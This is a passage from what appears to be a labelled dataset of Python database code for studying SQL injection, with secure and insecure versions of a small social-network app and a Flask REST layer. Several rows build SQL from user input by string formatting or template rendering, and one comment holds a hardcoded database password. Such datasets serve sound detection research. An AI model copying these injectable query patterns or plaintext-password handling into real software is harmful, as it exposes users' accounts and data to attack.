        #import pdb; pdb.set_trace()
        note = request.json.get(""Note"", """")
        class_name = cls.__name__
        result = db.delete_object(class_name, note, uuid)

        return j(""Slettet {0}: {1}"".format(class_name, uuid)), 200

    @classmethod
    def create_api(cls, hierarchy, flask, base_url):
        """"""Set up API with correct database access functions.""""""
        hierarchy = hierarchy.lower()
        class_name = cls.__name__.lower()
        class_url = u""{0}/{1}/{2}"".format(base_url,
                                          hierarchy,
                                          cls.__name__.lower())
        uuid_regex = (
            ""[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}"" +
            ""-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}""
        )
        object_url = u'{0}/<regex(""{1}""):uuid>'.format(
            class_url,
            uuid_regex
        )

        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),
                           cls.get_objects, methods=['GET'])

        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),
                           cls.get_object, methods=['GET'])

        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),
                           cls.put_object, methods=['PUT'])

        flask.add_url_rule(
            class_url, u'_'.join([cls.__name__, 'create_object']),
            cls.create_object, methods=['POST']
        )

        flask.add_url_rule(
            object_url, u'_'.join([cls.__name__, 'delete_object']),
            cls.delete_object, methods=['DELETE']
        )
/n/n/n",0,sql
25,31,b0b9410c36bce2e946d48695d9a0eca31b11c15a,"/klassifikation/rest/db.py/n/nfrom enum import Enum

import psycopg2
from psycopg2.extras import DateTimeTZRange
from jinja2 import Template

from settings import DATABASE, DB_USER
from db_helpers import get_attribute_fields, get_attribute_names
from db_helpers import get_state_names

""""""
    GENERAL FUNCTION AND CLASS DEFINITIONS
""""""


def get_connection():
    """"""Handle all intricacies of connecting to Postgres.""""""
    connection = psycopg2.connect(""dbname={0} user={1}"".format(DATABASE,
                                                               DB_USER))
    connection.autocommit = True
    return connection


def get_authenticated_user():
    """"""Return hardcoded UUID until we get real authentication in place.""""""
    return ""615957e8-4aa1-4319-a787-f1f7ad6b5e2c""


def convert_attributes(attributes):
    ""Convert attributes from dictionary to list in correct order.""
    for attr_name in attributes:
        current_attr_periods = attributes[attr_name]
        converted_attr_periods = []
        for attr_period in current_attr_periods:
            field_names = get_attribute_fields(attr_name)
            attr_value_list = [
                attr_period[f] if f in attr_period else None
                for f in field_names
                ]
            converted_attr_periods.append(attr_value_list)
        attributes[attr_name] = converted_attr_periods
    return attributes


class Livscyklus(Enum):
    OPSTAAET = 'Opstaaet'
    IMPORTERET = 'Importeret'
    PASSIVERET = 'Passiveret'
    SLETTET = 'Slettet'
    RETTET = 'Rettet'


""""""
    GENERAL SQL GENERATION.

    All of these functions generate bits of SQL to use in complete statements.
    At some point, we might want to factor them to an ""sql_helpers.py"" module.
""""""


def sql_state_array(state, periods, class_name):
    """"""Return an SQL array of type <state>TilsType.""""""
    with open('templates/sql/state_array.sql', 'r') as f:
        raw_sql = f.read()
    t = Template(raw_sql)
    sql = t.render(class_name=class_name, state_name=state,
                   state_periods=periods)
    return sql


def sql_attribute_array(attribute, periods):
    """"""Return an SQL array of type <attribute>AttrType[].""""""
    with open('templates/sql/attribute_array.sql', 'r') as f:
        raw_sql = f.read()
    t = Template(raw_sql)
    sql = t.render(attribute_name=attribute, attribute_periods=periods)
    return sql


def sql_relations_array(class_name, relations):
    """"""Return an SQL array of type <class_name>RelationType[].""""""
    with open('templates/sql/relations_array.sql', 'r') as f:
        raw_sql = f.read()
    t = Template(raw_sql)
    sql = t.render(class_name=class_name, relations=relations)
    return sql


def sql_convert_registration(states, attributes, relations, class_name):
    """"""Convert input JSON to the SQL arrays we need.""""""
    sql_states = []
    for s in get_state_names(class_name):
        periods = states[s] if s in states else []
        sql_states.append(
            sql_state_array(s, periods, class_name)
        )

    sql_attributes = []
    for a in get_attribute_names(class_name):
        periods = attributes[a] if a in attributes else []
        sql_attributes.append(
            sql_attribute_array(a, periods)
        )

    sql_relations = sql_relations_array(class_name, relations)

    return (sql_states, sql_attributes, sql_relations)


""""""
    GENRAL OBJECT RELATED FUNCTIONS
""""""


def object_exists(class_name, uuid):
    """"""Check if an object with this class name and UUID exists already.""""""
    sql = ""select (%s IN (SELECT DISTINCT facet_id from facet_registrering))""
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql, (uuid,))
    result = cursor.fetchone()[0]
    
    return result


def create_or_import_object(class_name, note, attributes, states, relations,
                            uuid=None):
    """"""Create a new object by calling the corresponding stored procedure.

    Create a new object by calling actual_state_create_or_import_{class_name}.
    It is necessary to map the parameters to our custom PostgreSQL data types.
    """"""

    # Data from the BaseRegistration.
    # Do not supply date, that is generated by the DB.
    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None
                       else Livscyklus.IMPORTERET.value)
    user_ref = get_authenticated_user()

    attributes = convert_attributes(attributes)
    (
        sql_states, sql_attributes, sql_relations
    ) = sql_convert_registration(states, attributes, relations, class_name)
    with open('templates/sql/create_object.sql', 'r') as f:
        sql_raw = f.read()
    sql_template = Template(sql_raw)
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note,
        states=sql_states,
        attributes=sql_attributes,
        relations=sql_relations)
    # Call Postgres! Return OK or not accordingly
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]


def delete_object(class_name, note, uuid):
    """"""Delete object by using the stored procedure.
    
    Deleting is the same as updating with the life cycle code ""Slettet"".
    """"""

    user_ref = get_authenticated_user()
    life_cycle_code = Livscyklus.SLETTET.value
    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:
        sql_raw = f.read()
    sql_template = Template(sql_raw)
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note
    )
    # Call Postgres! Return OK or not accordingly
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]

def passivate_object(class_name, note, uuid):
    """"""Passivate object by calling the stored procedure.""""""

    user_ref = get_authenticated_user()
    life_cycle_code = Livscyklus.PASSIVERET.value
    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:
        sql_raw = f.read()
    sql_template = Template(sql_raw)
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note
    )
    # Call PostgreSQL
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]


def update_object(class_name, note, attributes, states, relations, uuid=None):
    """"""Update object with the partial data supplied.""""""
    life_cycle_code = Livscyklus.RETTET.value
    user_ref = get_authenticated_user()

    attributes = convert_attributes(attributes)
    (
        sql_states, sql_attributes, sql_relations
    ) = sql_convert_registration(states, attributes, relations, class_name)

    with open('templates/sql/update_object.sql', 'r') as f:
        sql_raw = f.read()
    sql_template = Template(sql_raw)
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note,
        states=sql_states,
        attributes=sql_attributes,
        relations=sql_relations)
    # Call PostgreSQL
    conn = get_connection()
    cursor = conn.cursor()
    try:
        cursor.execute(sql)
        output = cursor.fetchone()
        print output
    except psycopg2.DataError:
        # Thrown when no changes
        pass
    return uuid


def list_objects(class_name, uuid, virkning_fra, virkning_til,
                 registreret_fra, registreret_til):
    """"""List objects with the given uuids, optionally filtering by the given
    virkning and registering periods.""""""

    assert isinstance(uuid, list)

    with open('templates/sql/list_objects.sql', 'r') as f:
        sql_raw = f.read()
    sql_template = Template(sql_raw)
    sql = sql_template.render(
        class_name=class_name
    )

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql, {
        'uuid': uuid,
        'registrering_tstzrange': DateTimeTZRange(registreret_fra,
                                                  registreret_til),
        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)
    })
    output = cursor.fetchone()
    return output
/n/n/n/klassifikation/rest/oio_rest.py/n/n
from flask import jsonify, request
import db


# Just a helper during debug
def j(t): return jsonify(output=t)


class OIOStandardHierarchy(object):
    """"""Implement API for entire hierarchy.""""""

    _classes = []

    @classmethod
    def setup_api(cls, flask, base_url):
        """"""Set up API for the classes included in the hierarchy.

        Note that version number etc. may have to be added to the URL.""""""
        for c in cls._classes:
            c.create_api(cls._name, flask, base_url)


class OIORestObject(object):
    """"""
    Implement an OIO object - manage access to database layer for this object.

    This class is intended to be subclassed, but not to be initialized.
    """"""

    @classmethod
    def create_object(cls):
        """"""
        CREATE object, generate new UUID.
        """"""
        if not request.json:
            abort(400)
        note = request.json.get(""Note"", """")
        attributes = request.json.get(""Attributter"", {})
        states = request.json.get(""Tilstande"", {})
        relations = request.json.get(""Relationer"", {})
        uuid = db.create_or_import_object(cls.__name__, note, attributes,
                                          states, relations)
        return jsonify({'uuid': uuid}), 201

    @classmethod
    def get_objects(cls):
        """"""
        LIST or SEARCH facets, depending on parameters.
        """"""
        virkning_fra = request.args.get('virkningFra', None)
        virkning_til = request.args.get('virkningTil', None)
        registreret_fra = request.args.get('registreretFra', None)
        registreret_til = request.args.get('registreretTil', None)

        # TODO: Implement search

        uuid = request.args.get('uuid', None)
        if uuid is None:
            # This is not allowed, but we let the DB layer throw an exception
            uuid = []
        else:
            uuid = uuid.split(',')

        results = db.list_objects(cls.__name__, uuid, virkning_fra,
                                 virkning_til, registreret_fra,
                                 registreret_til)
        if results is None:
            results = []
        # TODO: Return JSON object key should be based on class name,
        # e.g. {""Facetter"": [..]}, not {""results"": [..]}
        # TODO: Include Return value
        return jsonify({'results': results})

    @classmethod
    def get_object(cls, uuid):
        """"""
        READ a facet, return as JSON.
        """"""
        return j(""Hent {0} fra databasen og returner som JSON"".format(uuid))

    @classmethod
    def put_object(cls, uuid):
        """"""
        UPDATE, IMPORT or PASSIVIZE an  object.
        """"""
        if not request.json:
            abort(400)
        # Get most common parameters if available.
        note = request.json.get(""Note"", """")
        attributes = request.json.get(""Attributter"", {})
        states = request.json.get(""Tilstande"", {})
        relations = request.json.get(""Relationer"", {})

        if not db.object_exists(cls.__name__, uuid):
            # Do import.
            result = db.create_or_import_object(cls.__name__, note, attributes,
                                                states, relations, uuid)
            # TODO: When connected to DB, use result properly.
            return j(u""Importeret {0}: {1}"".format(cls.__name__, uuid)), 200
        else:
            ""Edit or passivate.""
            if (request.json.get('livscyklus', '').lower() == 'passiv'):
                # Passivate
                db.passivate_object(
                        cls.__name__, note, uuid
                )
                return j(
                            u""Passiveret {0}: {1}"".format(cls.__name__, uuid)
                        ), 200
            else:
                # Edit/change
                result = db.update_object(cls.__name__, note, attributes,
                                          states, relations, uuid)
                return j(u""Opdateret {0}: {1}"".format(cls.__name__, uuid)), 200
        return j(u""Forkerte parametre!""), 405

    @classmethod
    def delete_object(cls, uuid):
        # Delete facet
        #import pdb; pdb.set_trace()
        note = request.json.get(""Note"", """")
        class_name = cls.__name__
        result = db.delete_object(class_name, note, uuid)

        return j(""Slettet {0}: {1}"".format(class_name, uuid)), 200

    @classmethod
    def create_api(cls, hierarchy, flask, base_url):
        """"""Set up API with correct database access functions.""""""
        hierarchy = hierarchy.lower()
        class_name = cls.__name__.lower()
        class_url = u""{0}/{1}/{2}"".format(base_url,
                                          hierarchy,
                                          cls.__name__.lower())
        uuid_regex = (
            ""[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}"" +
            ""-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}""
        )
        object_url = u'{0}/<regex(""{1}""):uuid>'.format(
            class_url,
            uuid_regex
        )

        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),
                           cls.get_objects, methods=['GET'])

        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),
                           cls.get_object, methods=['GET'])

        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),
                           cls.put_object, methods=['PUT'])

        flask.add_url_rule(
            class_url, u'_'.join([cls.__name__, 'create_object']),
            cls.create_object, methods=['POST']
        )

        flask.add_url_rule(
            object_url, u'_'.join([cls.__name__, 'delete_object']),
            cls.delete_object, methods=['DELETE']
        )
/n/n/n",1,sql
26,124,5329d91f9e569c95184053c8e7ef596949c33ce9,"modules/comment.py/n/nfrom modules import sql


class Comment:
    def __init__(self,conn):
        self.conn=conn;
    
    def getCommentsByUser(self,userid):
        sqlText=""select comment from comments order by date desc where userid=%s""
        params=[userid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;
    
    def getCommentsByPostid(self,postid,userid):
        sqlText=""select (select Count(*) from comment_like where \
        comments.commentid = comment_like.commentid) as like,(select Count(*) \
                from comment_like where comments.commentid = \
                comment_like.commentid and comment_like.userid=%s) as \
                flag,commentid,name,comment from users,comments where \
                users.userid=comments.userid and postid=%s order by date desc;""
        params=[userid,postid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;

    def getCommentsLike(self,commentid):
        sqlText=""select userid from comment_like where commentid=%s""
        params=[commentid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;
	
    def insertData(self,comment,userid,postid):
        sqlText=""insert into comments(comment,userid,date,postid) \
        values(%s,%s,current_timestamp(0),%s);""
        params=[comment,userid,postid]
        result=sql.insertDB(self.conn,sqlText,params)
        return result;

    def deleteComment(self,commentid):
        sqlText=""delete from comments where commentid=%s""
        params=[commentid]
        result=sql.deleteDB(self.conn,sqlText,params)
        return result;

    def likeComments(self,commentid,userid):
        sqlText=""insert into comment_like values(%s,%s);""
        params=[userid,commentid]
        result=sql.insertDB(self.conn,sqlText,params)
        return result;

    def dislikeComments(self,commentid,userid):
        sqlText=""delete from comment_like where commentid=%s and userid=%s;""
        params=[commentid,userid]
        result=sql.deleteDB(self.conn,sqlText,params)
        return result;



/n/n/nmodules/post.py/n/nfrom modules import sql


class Post:
    def __init__(self,conn):
        self.conn=conn;

    def getAllPosts(self,userid):
        sqlText=""select users.name,post.comment,post.postid,(select Count(*) from post_like \
                where post.postid = post_like.postid) as like,\
                (select Count(*) from post_like where post.postid =post_like.postid \
                and post_like.userid=%s) as flag from users,post \
                where post.userid=users.userid and (post.userid in \
                (select friendid from friends where userid =%s) or post.userid=%s)\
                order by post.date desc;""
        params=[userid,userid,userid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;
    
    def getPostsByPostid(self,postid):
        sqlText=""select users.name,post.comment from users,post where \
                users.userid=post.userid and post.postid=%s""
        params=[postid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;
    
    def getPostLike(self,postid):
        sqlText=""select userid from post_like where postid=%s""
        params=[postid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;

    def likePost(self,postid,userid):
        sqlText=""insert into post_like values(%s,%s);""
        params=[postid,userid]
        result=sql.insertDB(self.conn,sqlText,params)
        return result;

    def dislikePost(self,postid,userid):
        sqlText=""delete from post_like where postid=%s and userid=%s;""
        params=[postid,userid]
        result=sql.deleteDB(self.conn,sqlText,params)
        return result;

    def insertData(self,userid,post):
        sqlText=""insert into post(userid,date,comment) \
                values(%s,current_timestamp(0),%s);""
        params=[userid,post];
        result=sql.insertDB(self.conn,sqlText,params)
        return result;


    def deletePost(self,postid):
        sqlText=""delete from post where post.postid=%s""
        params=[postid]
        result=sql.deleteDB(self.conn,sqlText,params)
        return result;
/n/n/nmodules/sql.py/n/nimport psycopg2



#链接数据库
def connectDB(dbname,uname,psw):
    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=""127.0.0.1"",port=""5432"")
    return conn


#查询数据库
def queryDB(conn,sql_select,params):
    print(""query data"")
    cur=conn.cursor()
    try:
        cur.execute(sql_select,params)
        rows=cur.fetchall()
    except Exception as err:
        closeDB(conn)
        print(err)
    else:
        return rows



#插入数据
def insertDB(conn,sql_insert,params):
    cur=conn.cursor()
    try:
        cur.execute(sql_insert,params)
        conn.commit()
    except Exception as err:
        closeDB(conn)
        print(err)
    else: 
        print(""insert data successfull"")

#delete data
def deleteDB(conn,sql_delete,params):
    cur=conn.cursor()
    try:
        cur.execute(sql_delete,params)
        conn.commit()
    except Exception as err:
        closeDB(conn)
        print(err)
    else: 
        print(""delete data successfull"")


#update data
def updateDB(conn,sql_update,params):
    cur=conn.cursor()
    try:
        cur.execute(sql_update,params)
        conn.commit()
    except Exception as err:
        closeDB(conn)
        print(err)
    else: 
        print(""update data successfull"")



#关闭链接
def closeDB(conn):
    conn.close()



/n/n/nmodules/users.py/n/nfrom modules import sql

class Users:
    def __init__(self,conn=None,name=None,password=None,email=None,country=None):
        self.name=name
        self.password=password
        self.email=email
        self.country=country
        self.conn=conn

    def clean(self):
        self.name=None;
        self.password=None;
        self.email=None;
        self.count=None;
 

    def userLogin(self):

        sqlName=""select count(*) from users where name=%s and password=%s;""
        params = [self.name,self.password]
        checkName=sql.queryDB(self.conn,sqlName,params)
        result=checkName[0][0]
        if result == 0:
            self.clean()
            return False
        else:
            return True


    def userApply(self):
        sql_insert=""insert into \
                users(name,password,email,country,inscription_date) \
                values(%s,%s,%s,%s,current_timestamp(0));""

        sqlName=""select count(*) from users where name=%s;""
        params = [self.name]
        checkName=sql.queryDB(self.conn,sqlName,params)
        #no name
        if checkName[0][0] == 0:
            params.extend([self.password,self.email,self.country])
            sql.insertDB(self.conn,sql_insert,params)
            return True
        else:
            return False

    def getUserID(self):
        sqlName=""select userid from users where name=%s;""
        params = [self.name]
        userid=sql.queryDB(self.conn,sqlName,params)
        return userid[0][0];

    def getAllPosts(self):
        sqlText=""select comment from post where userid=%s order by date;""
        params = [self.userid]
        allposts=sql.queryDB(self.conn,sqlName,params)
        return allposts;


    def getAllComments(self):
        sqlText=""select comment from comments where userid=%s order by date;""
        params = [self.userid]
        allposts=sql.queryDB(self.conn,sqlText,params)
        return allposts;

    def getAllInformation(self,userid):
        sqlText=""select name,password,email,country from users where userid=%s;""
        params = [userid]
        information=sql.queryDB(self.conn,sqlText,params)
        return information;


    def modifyUserInfo(self,userid,flag):
        sqlText=""update users \
                set name=%s,password=%s,email=%s,country=%s where userid=%s;""
        if(flag==1): 
            sqlName=""select count(*) from users where name=%s;""
            params = [self.name]
            checkName=sql.queryDB(self.conn,sqlName,params)
            #no name
            if checkName[0][0] == 0:
                params.extend([self.password,self.email,self.country,userid])
                sql.updateDB(self.conn,sqlText,params)
                return True
            else:
                return False
        else:
            params=[self.name,self.password,self.email,self.country,userid]
            sql.updateDB(self.conn,sqlText,params)
            return True;

    def followFriends(self,userid,friendid):
        sqlText=""insert into friends values(%s,%s);""
        params=[friendid,userid]
        result=sql.insertDB(self.conn,sqlText,params)
        return result;

    def cancelFollow(self,userid,friendid):
        sqlText=""delete from friends where userid=%d and friendid=%s;""
        params=[userid,friendid]
        result=sql.deleteDB(self.conn,sqlText,params)
        return result;

    def getUsers(self,userid):
        sqlText=""select userid,name,country,(select Count(*) from friends \
                where users.userid=friends.friendid and friends.userid=%s) as follow \
                from users;""
        params=[userid]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;


    def getUsersByName(self,userid,username):
        sqlText=""select userid,name,country,(select Count(*) from friends \
                where users.userid=friends.friendid and friends.userid=%s) as follow \
                from users where users.name~%s;""
        params=[userid,username]
        result=sql.queryDB(self.conn,sqlText,params)
        return result;







/n/n/n",0,sql
27,125,5329d91f9e569c95184053c8e7ef596949c33ce9,"/modules/comment.py/n/nfrom modules import sql


class Comment:
    def __init__(self,conn):
        self.conn=conn;
    
    def getCommentsByUser(self,userid):
        sqlText=""select comment from comments order by date desc where userid=%d""%(userid)
        result=sql.queryDB(self.conn,sqlText)
        return result;
    
    def getCommentsByPostid(self,postid,userid):
        sqlText=""select (select Count(*) from comment_like where comments.commentid = comment_like.commentid) as like,(select Count(*) from comment_like where comments.commentid = comment_like.commentid and comment_like.userid=%d) as flag,commentid,name,comment from users,comments where users.userid=comments.userid and postid=%d order by date desc;""%(userid,postid)
        result=sql.queryDB(self.conn,sqlText)
        return result;

    def getCommentsLike(self,commentid):
        sqlText=""select userid from comment_like where commentid=%d""%(commentid)
        result=sql.queryDB(self.conn,sqlText)
        return result;
	
    def insertData(self,comment,userid,postid):
        sqlText=""insert into comments(comment,userid,date,postid) values('%s',%d,current_timestamp(0),%d);""%(comment,userid,postid)
        result=sql.insertDB(self.conn,sqlText)
        return result;

    def deleteComment(self,commentid):
        sqlText=""delete from comments where commentid=%d""%(commentid)
        result=sql.deleteDB(self.conn,sqlText)
        return result;

    def likeComments(self,commentid,userid):
        sqlText=""insert into comment_like values(%d,%d);""%(userid,commentid)
        result=sql.insertDB(self.conn,sqlText)
        return result;

    def dislikeComments(self,commentid,userid):
        sqlText=""delete from comment_like where commentid=%d and userid=%d;""%(commentid,userid)
        result=sql.deleteDB(self.conn,sqlText)
        return result;



/n/n/n/modules/post.py/n/nfrom modules import sql


class Post:
    def __init__(self,conn):
        self.conn=conn;

    def getAllPosts(self,userid):
        sqlText=""select users.name,post.comment,post.postid,(select Count(*) from post_like \
                where post.postid = post_like.postid) as like,\
                (select Count(*) from post_like where post.postid =post_like.postid \
                and post_like.userid=%d) as flag from users,post \
                where post.userid=users.userid and (post.userid in \
                (select friendid from friends where userid =%d) or post.userid=%d )\
                order by post.date desc;""%(userid,userid,userid)
        result=sql.queryDB(self.conn,sqlText)
        return result;
    
    def getPostsByPostid(self,postid):
        sqlText=""select users.name,post.comment from users,post where \
                users.userid=post.userid and post.postid=%d""%(postid)
        result=sql.queryDB(self.conn,sqlText)
        return result;
    
    def getPostLike(self,postid):
        sqlText=""select userid from post_like where postid=%d""%(postid)
        result=sql.queryDB(self.conn,sqlText)
        return result;

    def likePost(self,postid,userid):
        sqlText=""insert into post_like values(%d,%d);""%(postid,userid)
        result=sql.insertDB(self.conn,sqlText)
        return result;

    def dislikePost(self,postid,userid):
        sqlText=""delete from post_like where postid=%d and userid=%d;""%(postid,userid)
        result=sql.deleteDB(self.conn,sqlText)
        return result;

    def insertData(self,userid,post):
        sqlText=""insert into post(userid,date,comment) \
                values(%d,current_timestamp(0),'%s');""%(userid,post);
        result=sql.insertDB(self.conn,sqlText)
        return result;


    def deletePost(self,postid):
        sqlText=""delete from post where post.postid=%d""%(postid)
        result=sql.deleteDB(self.conn,sqlText)
        return result;
/n/n/n/modules/sql.py/n/nimport psycopg2



#链接数据库
def connectDB(dbname,uname,psw):
    #conn=psycopg2.connect(database=""test"",user=""lishaomin"",password=""19931004"",host=""127.0.0.1"",port=""5432"")
    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=""127.0.0.1"",port=""5432"")
    return conn


#查询数据库
def queryDB(conn,sql_select):
    print(""query data"")
    cur=conn.cursor()
    #sql_select=""select * from users;""
    cur.execute(sql_select)
    rows=cur.fetchall()
    #for row in rows:
    #print (""user:%s""%(row[1]))
    return rows



#插入数据
def insertDB(conn,sql_insert):
    cur=conn.cursor()
    result=cur.execute(sql_insert)
    conn.commit()
    print(""insert data successfull"")
    return result

#delete data
def deleteDB(conn,sql_delete):
    cur=conn.cursor()
    result=cur.execute(sql_delete)
    conn.commit()
    print(""delete data successfull"")
    return result


#update data
def updateDB(conn,sql_update):
    cur=conn.cursor()
    result=cur.execute(sql_update)
    conn.commit()
    print(""update data successfull"")
    return result


#关闭链接
def closeDB(conn):
    conn.close()



/n/n/n/modules/users.py/n/nfrom modules import sql

class Users:
    def __init__(self,conn=None,name=None,password=None,email=None,country=None):
        self.name=name
        self.password=password
        self.email=email
        self.country=country
        self.conn=conn

    def clean(self):
        self.name=None;
        self.password=None;
        self.email=None;
        self.count=None;
 

    def userLogin(self):

        sqlName=""select count(*) from users where name='%s' and \
                password='%s';""%(self.name,self.password)
        checkName=sql.queryDB(self.conn,sqlName)

        result=checkName[0][0]
        if result == 0:
            self.clean()
            return False
        else:
            return True


    def userApply(self):
        t_sql_insert=""insert into \
                users(name,password,email,country,inscription_date) \
                values('{name}','{psw}','{email}','{country}',current_timestamp(0));""
        sql_insert=t_sql_insert.format(name=self.name,psw=self.password,\
                email=self.email,country=self.country)

        sqlName=""select count(*) from users where name='%s';""%(self.name)
        checkName=sql.queryDB(self.conn,sqlName)
    
        #no name
        if checkName[0][0] == 0:
            sql.insertDB(self.conn,sql_insert)
            return True
        else:
            return False

    def getUserID(self):
        sqlName=""select userid from users where name='%s';""%(self.name)
        userid=sql.queryDB(self.conn,sqlName)
        return userid[0][0];

    def getAllPosts(self):
        sqlText=""select comment from post where userid=%d order by date;""
        allposts=sql.queryDB(self.conn,sqlText)
        return allposts;


    def getAllComments(self):
        sqlText=""select comment from comments where userid=%d order by date;""
        allposts=sql.queryDB(self.conn,sqlText)
        return allposts;

    def getAllInformation(self,userid):
        sqlText=""select name,password,email,country from users where userid=%d;""%(userid)
        information=sql.queryDB(self.conn,sqlText)
        return information;


    def modifyUserInfo(self,userid,flag):
        sqlText=""update users \
                set name='%s',password='%s',email='%s',country='%s' \
                where userid='%d';""%(self.name,self.password,self.email,self.country,userid)
        if(flag==1): 
            sqlName=""select count(*) from users where name='%s';""%(self.name)
            checkName=sql.queryDB(self.conn,sqlName)
            #no name
            if checkName[0][0] == 0:
                sql.updateDB(self.conn,sqlText)
                return True
            else:
                return False
        else:
            sql.updateDB(self.conn,sqlText)
            return True;

    def followFriends(self,userid,friendid):
        sqlText=""insert into friends values(%d,%d);""%(friendid,userid)
        result=sql.insertDB(self.conn,sqlText)
        return result;

    def cancelFollow(self,userid,friendid):
        sqlText=""delete from friends where userid=%d and friendid=%d;""%(userid,friendid)
        result=sql.deleteDB(self.conn,sqlText)
        return result;

    def getUsers(self,userid):
        sqlText=""select userid,name,country,(select Count(*) from friends \
                where users.userid=friends.friendid and friends.userid=%d) as follow \
                from users;""%(userid)
        result=sql.queryDB(self.conn,sqlText)
        return result;


    def getUsersByName(self,userid,username):
        sqlText=""select userid,name,country,(select Count(*) from friends \
                where users.userid=friends.friendid and friends.userid=%d) as follow \
                from users where users.name='%s';""%(userid,username)
        result=sql.queryDB(self.conn,sqlText)
        return result;







/n/n/n",1,sql
28,12,ad9fef5f416ef31eb3fdf7c1774434092fd6a52c,"sabnzbd/database.py/n/n#!/usr/bin/python -OO
# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

""""""
sabnzbd.database - Database Support
""""""

try:
    import sqlite3
except:
    try:
        import pysqlite2.dbapi2 as sqlite3
    except:
        pass

import os
import time
import zlib
import logging
import sys
import threading

import sabnzbd
import sabnzbd.cfg
from sabnzbd.constants import DB_HISTORY_NAME, STAGES
from sabnzbd.encoding import unicoder
from sabnzbd.bpsmeter import this_week, this_month
from sabnzbd.decorators import synchronized
from sabnzbd.misc import get_all_passwords, int_conv

DB_LOCK = threading.RLock()


def convert_search(search):
    """""" Convert classic wildcard to SQL wildcard """"""
    if not search:
        # Default value
        search = ''
    else:
        # Allow * for wildcard matching and space
        search = search.replace('*', '%').replace(' ', '%')

    # Allow ^ for start of string and $ for end of string
    if search and search.startswith('^'):
        search = search.replace('^', '')
        search += '%'
    elif search and search.endswith('$'):
        search = search.replace('$', '')
        search = '%' + search
    else:
        search = '%' + search + '%'
    return search


class HistoryDB(object):
    """""" Class to access the History database
        Each class-instance will create an access channel that
        can be used in one thread.
        Each thread needs its own class-instance!
    """"""
    # These class attributes will be accessed directly because
    # they need to be shared by all instances
    db_path = None        # Will contain full path to history database
    done_cleaning = False # Ensure we only do one Vacuum per session

    @synchronized(DB_LOCK)
    def __init__(self):
        """""" Determine databse path and create connection """"""
        self.con = self.c = None
        if not HistoryDB.db_path:
            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)
        self.connect()


    def connect(self):
        """""" Create a connection to the database """"""
        create_table = not os.path.exists(HistoryDB.db_path)
        self.con = sqlite3.connect(HistoryDB.db_path)
        self.con.row_factory = dict_factory
        self.c = self.con.cursor()
        if create_table:
            self.create_history_db()
        elif not HistoryDB.done_cleaning:
            # Run VACUUM on sqlite
            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space
            # http://www.sqlite.org/lang_vacuum.html
            HistoryDB.done_cleaning = True
            self.execute('VACUUM')

        self.execute('PRAGMA user_version;')
        try:
            version = self.c.fetchone()['user_version']
        except TypeError:
            version = 0
        if version < 1:
            # Add any missing columns added since first DB version
            # Use ""and"" to stop when database has been reset due to corruption
            _ = self.execute('PRAGMA user_version = 1;') and \
                self.execute('ALTER TABLE ""history"" ADD COLUMN series TEXT;') and \
                self.execute('ALTER TABLE ""history"" ADD COLUMN md5sum TEXT;')
        if version < 2:
            # Add any missing columns added since second DB version
            # Use ""and"" to stop when database has been reset due to corruption
            _ = self.execute('PRAGMA user_version = 2;') and \
                self.execute('ALTER TABLE ""history"" ADD COLUMN password TEXT;')


    def execute(self, command, args=(), save=False):
        ''' Wrapper for executing SQL commands '''
        for tries in xrange(5, 0, -1):
            try:
                if args and isinstance(args, tuple):
                    self.c.execute(command, args)
                else:
                    self.c.execute(command)
                if save:
                    self.save()
                return True
            except:
                error = str(sys.exc_value)
                if tries >= 0 and 'is locked' in error:
                    logging.debug('Database locked, wait and retry')
                    time.sleep(0.5)
                    continue
                elif 'readonly' in error:
